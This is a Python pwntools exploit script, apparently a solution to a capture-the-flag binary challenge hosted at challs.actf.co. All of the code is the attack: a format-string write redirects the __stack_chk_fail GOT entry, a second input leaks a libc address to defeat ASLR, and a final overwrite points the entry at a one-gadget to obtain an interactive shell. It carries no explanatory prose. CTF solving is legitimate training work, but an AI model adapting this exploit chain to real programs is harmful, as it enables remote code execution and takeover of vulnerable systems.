from pwn import *
from icecream import ic

elf = exe = ELF("./og_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challs.actf.co", 31312)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x0000000000401239
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

go = 0x0000000000401196
ru("kill $PPID; Enter your name:")
payload = fmtstr_payload(6, {elf.got["__stack_chk_fail"] : go}, write_size='short')
# payload += b"%23$p..."
sl(payload)


ru("kill $PPID; Enter your name:")
payload = b"%23$p."
payload = payload.ljust(0x32, b'a')
sl(payload)
ru("Gotta go. See you around, ")
libc.address = int(ru(".").strip().decode()[:-1], 16) - 0x29d90

ic(hex(libc.address))
payload = fmtstr_payload(6, {elf.got["__stack_chk_fail"] : libc.address + 0xebc85}, write_size='short')

ru("kill $PPID; Enter your name:")
sl(payload)
io.interactive()
